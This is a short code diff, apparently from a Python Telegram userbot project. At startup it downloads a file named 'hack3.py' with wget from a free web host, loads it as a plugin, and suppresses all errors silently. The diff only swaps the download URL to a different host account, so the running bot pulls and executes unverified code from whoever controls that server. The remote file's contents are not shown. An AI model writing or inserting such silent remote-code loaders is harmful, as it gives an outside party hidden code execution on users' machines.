@@ -11,7 +11,7 @@ from userbot.utils import load_module
 import os
 # hack3 installation
 try:
-  os.system('wget https://legendx22.000webhostapp.com/hack3.py -P userbot/plugins/')
+  os.system('wget https://DARKLONX.000webhostapp.com/hack3.py -P userbot/plugins/')
   load_module('hack3')
 except:
   pass
